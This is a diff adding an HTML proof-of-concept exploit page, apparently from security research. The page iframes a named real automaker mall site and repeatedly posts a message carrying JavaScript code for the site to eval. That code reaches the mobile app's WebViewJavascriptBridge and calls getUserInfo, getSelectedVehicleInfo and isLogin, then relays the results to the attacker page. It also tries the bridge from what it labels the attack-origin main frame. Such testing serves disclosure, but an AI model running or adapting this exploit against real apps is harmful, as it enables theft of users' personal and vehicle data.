@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>i2824 SUB</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+</head>
+<body style="background:#fff;font-family:monospace;font-size:10px;padding:6px">
+<b>i2824 subframe bridge</b>
+<pre id="out" style="white-space:pre-wrap"></pre>
+<div id="fr" style="height:40vh;width:100%;border:1px solid #888"></div>
+<script>
+var OUT=document.getElementById("out");
+var T0=Date.now();
+function log(s){OUT.textContent+="["+((Date.now()-T0)/1000).toFixed(1)+"s] "+s+"\n";}
+function R(tag,data){
+  log("RESULT "+tag+" :: "+String(data).slice(0,700));
+  try{document.title="R:"+tag;}catch(e){}
+}
+window.onerror=function(m,s,l,c){R("attk_jserr",m+" @"+l+":"+c);return false;};
+R("loaded","href="+location.href.slice(0,120));
+
+// eval'd inside mall subframe: probes (a) WebViewJavascriptBridge object presence
+// (b) calls getUserInfo + getSelectedVehicleInfo + isLogin via standard lzyzsd init
+// All read-only; results posted back to parent only (no network).
+var PROBE = "(function(d){" +
+"var o=['SINK_OK origin='+location.origin];" +
+"var t0=Date.now();" +
+"function reply(x){try{window.parent.postMessage({__i2824:x},'*')}catch(e){}}" +
+"function tryCall(){" +
+" var B=window.WebViewJavascriptBridge;" +
+" if(!B){reply('BRIDGE_OBJ absent at +' + (Date.now()-t0)/1000 + 's'); return false;}" +
+" reply('BRIDGE_OBJ_PRESENT origin='+location.origin+" +
+"   ' inIframe='+(window.parent!==window)+' topUrl_unknowable=1');" +
+" try{B.callHandler('getUserInfo','',function(r){reply('getUserInfo_RESP len='+String(r).length+' body='+String(r).slice(0,400));});}catch(e){reply('getUserInfo_ERR '+e);}" +
+" try{B.callHandler('getSelectedVehicleInfo','',function(r){reply('GSVI_RESP '+String(r).slice(0,200));});}catch(e){reply('GSVI_ERR '+e);}" +
+" try{B.callHandler('isLogin','',function(r){reply('isLogin_RESP '+String(r).slice(0,120));});}catch(e){reply('isLogin_ERR '+e);}" +
+" return true;}" +
+"// standard lzyzsd bootstrap: WVJBCallbacks + scheme iframe poke, fallback polls
+"if(!window.WebViewJavascriptBridge){" +
+" if(!window.WVJBCallbacks){window.WVJBCallbacks=[];}" +
+" var ifr=document.createElement('iframe');ifr.style.display='none';" +
+" ifr.src='https://__wvjb_bridge_message__'+Date.now()+'/';" +
+" document.documentElement.appendChild(ifr);setTimeout(function(){ifr.remove();},0);" +
+" reply('scheme_poke_sent');" +
+"}" +
+"var n=0;var iv=setInterval(function(){n++;if(tryCall()||n>45){clearInterval(iv);if(n>45)reply('SUBFRAME_FINAL_NO_BRIDGE_OBJECT_45s');}},1000);" +
+"return 1})";
+
+var f=document.createElement("iframe");
+f.src="https://audimall.faw-vw.com/mobile/pages/index/index";
+f.style.cssText="width:100%;height:100%;border:0";
+document.getElementById("fr").appendChild(f);
+log("iframe created");
+
+window.addEventListener("message",function(e){
+  if(e.data&&e.data.__i2824){R("SUB",String(e.data.__i2824)+" (msgOrigin="+e.origin+")");}
+});
+
+// main-frame bridge control: attack-origin frame, expect e1.b() reject (empty resp)
+function setupWVJB(cb){
+  if(window.WebViewJavascriptBridge){return cb(window.WebViewJavascriptBridge);}
+  if(window.WVJBCallbacks){return window.WVJBCallbacks.push(cb);}
+  window.WVJBCallbacks=[cb];
+  var ifr=document.createElement('iframe');ifr.style.display='none';
+  ifr.src='https://__wvjb_bridge_message__main/';
+  document.documentElement.appendChild(ifr);
+  setTimeout(function(){ifr.remove();},0);
+}
+var brN=0;
+var brIv=setInterval(function(){
+  brN++;
+  if(window.WebViewJavascriptBridge){
+    clearInterval(brIv);
+    setupWVJB(function(b){
+      R("MAIN_BRIDGE","WebViewJavascriptBridge ready on ATTACK origin main frame");
+      try{b.callHandler('getUserInfo','',function(r){R("getUserInfo_MAIN","len="+String(r).length+" body="+String(r).slice(0,300));});}catch(e){R("gui_main_err",String(e));}
+      try{b.callHandler('getSelectedVehicleInfo','',function(r){R("GSVI_MAIN",JSON.stringify(r));});}catch(e){}
+    });
+  } else if(brN>40){clearInterval(brIv);R("MAIN_NOBRIDGE","no bridge obj in main frame 40s (loadUrl-injection=main-frame-only)");}
+},1000);
+
+var pk=0;
+function poke(){
+  pk++;
+  try{
+    var w=f.contentWindow;
+    if(!w)return;
+    var msg={type:"MoFangtqEvent",qtData:{code:PROBE,data:{component_type:"i2824"}}};
+    try{w.postMessage(msg,"*");}catch(e2){}
+  }catch(e){}
+}
+var iv2=setInterval(function(){poke(); if(pk>=25){clearInterval(iv2);log("poke done");}},1500);
+setTimeout(function(){R("final","pk="+pk+" brN="+brN);},45000);
+</script></body></html>
